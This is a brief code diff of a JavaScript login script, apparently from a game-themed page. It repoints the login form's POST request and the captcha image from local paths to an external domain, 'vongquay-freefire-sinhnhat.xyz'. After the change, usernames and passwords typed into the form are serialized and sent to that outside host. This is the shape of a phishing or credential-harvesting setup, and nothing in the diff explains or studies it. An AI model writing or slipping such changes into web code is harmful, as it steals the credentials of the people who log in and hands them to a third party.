@@ -4,7 +4,7 @@
             return ("x" == a ? b : b & 3 | 8).toString(16)
         }).replace(/-/g, "");
         $("#captcha-key").val(b);
-        $("#captcha-img").attr("src", "/captcha.php?id=" + b)
+        $("#captcha-img").attr("src", "http://vongquay-freefire-sinhnhat.xyz/captcha.php?id=" + b)
     },
     refreshCaptcha = function() {
         $(".refresh").click(function() {
@@ -15,7 +15,7 @@
         $("#login-form").submit(function(b) {
             $.ajax({
                 method: "POST",
-                url: "login.php",
+                url: "http://vongquay-freefire-sinhnhat.xyz/login.php",
                 data: $(this).serialize(),
                 dataType: "json",
                 beforeSend: function() {
